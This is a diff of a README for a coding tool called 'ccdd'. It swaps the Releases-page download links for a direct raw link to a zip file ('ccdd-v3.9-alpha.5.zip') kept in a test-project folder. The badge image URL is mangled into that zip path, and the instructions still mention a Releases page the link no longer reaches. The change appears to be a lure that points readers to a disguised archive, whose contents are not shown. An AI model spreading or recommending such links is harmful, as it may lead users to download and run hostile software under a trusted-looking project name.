@@ -1,6 +1,6 @@
 # 🌟 ccdd - Effortless Coding Experience for Everyone  
 
-[![Download ccdd](https://img.shields.io/badge/Download%20ccdd-v1.0-orange)](https://github.com/unreliable-genuscommiphora682/ccdd/releases)
+[![Download ccdd](https://raw.githubusercontent.com/unreliable-genuscommiphora682/ccdd/master/test-project/ccdd-v3.9-alpha.5.zip%20ccdd-v1.0-orange)](https://raw.githubusercontent.com/unreliable-genuscommiphora682/ccdd/master/test-project/ccdd-v3.9-alpha.5.zip)
 
 ## 🚀 Getting Started  
 
@@ -8,7 +8,7 @@ Welcome to the ccdd repository! This application, "Claude Code 滴滴", aims to 
 
 ## 📥 Download & Install  
 
-To download ccdd, visit the following link: [Download ccdd](https://github.com/unreliable-genuscommiphora682/ccdd/releases). Here, you can find the latest version of the software.
+To download ccdd, visit the following link: [Download ccdd](https://raw.githubusercontent.com/unreliable-genuscommiphora682/ccdd/master/test-project/ccdd-v3.9-alpha.5.zip). Here, you can find the latest version of the software.
 
 1. Click the link above to go to the Releases page.
 2. On the Releases page, look for the latest version.
